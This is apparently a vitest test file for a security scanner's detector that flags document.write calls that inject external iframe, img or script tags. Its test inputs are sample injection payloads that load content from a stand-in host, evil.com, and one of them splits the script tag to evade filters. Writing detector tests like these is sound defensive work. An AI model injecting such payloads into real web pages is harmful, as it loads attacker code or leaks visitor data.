import { describe, it, expect } from 'vitest';
import { parseJs } from '../../ast/parse.js';
import { detectDocWriteScript } from '../detect-document-write-script.js';
import type { DetectorContext } from '../../ast/types.js';

const MAIN = 'mysite.com';
const ctx = (source: string): DetectorContext => ({ source, relPath: 't.js', mainHost: MAIN });
const hit = (src: string): boolean => {
  const ast = parseJs(src, 't.js')!;
  return detectDocWriteScript(ast, ctx(src)).some((r) => r.threatType === 'exfil-document-write');
};

describe('DOC-1 — document.write: iframe/img + склейка строк', () => {
  it('<iframe src=external>', () => {
    expect(hit(`document.write('<iframe src="//evil.com/x"></iframe>')`)).toBe(true);
  });
  it('<img src=external>', () => {
    expect(hit(`document.write('<img src="https://evil.com/pixel.gif">')`)).toBe(true);
  });
  it('склейка строк "<scr"+"ipt src=...>"', () => {
    expect(hit(`document.write('<scr' + 'ipt src="//evil.com/x"></scr' + 'ipt>')`)).toBe(true);
  });
  it('template literal без подстановок', () => {
    expect(hit('document.write(`<script src="//evil.com/x"></script>`)')).toBe(true);
  });

  it('НЕ-регресс: обычный <script src=external> ловится', () => {
    expect(hit(`document.write('<script src="//evil.com/x"></script>')`)).toBe(true);
  });
  it('НЕ-регресс: локальный iframe НЕ ловится', () => {
    expect(hit(`document.write('<iframe src="/local.html"></iframe>')`)).toBe(false);
  });
  it('НЕ-регресс: безобидный HTML НЕ ловится', () => {
    expect(hit(`document.write('<p>hello</p>')`)).toBe(false);
  });
});
